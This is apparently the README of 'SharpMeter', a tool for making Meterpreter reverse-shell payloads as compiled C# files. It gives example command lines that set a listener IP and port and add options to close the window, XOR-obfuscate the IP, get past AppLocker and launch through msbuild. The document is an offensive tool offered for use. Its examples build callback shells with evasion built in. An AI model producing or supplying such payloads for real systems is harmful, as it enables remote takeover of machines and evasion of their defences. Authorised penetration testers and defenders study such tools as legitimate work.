# SharpMeter
A Simple Way To Make Meterpreter Reverse Payloads

# Example tcp
python SharpMeter.py 192.168.1.101 4444 compileme.cs tcp

# Example Close Window / XOR IP
python SharpMeter.py 192.168.1.101 443 compileme.cs https -w -x

# Example AppLocker
python SharpMeter.py 192.168.1.101 443 compileme.cs https -w -a -x

# Example msbuild!
python SharpMeter.py 192.168.1.101 80 compileme.cs http -w -x -m
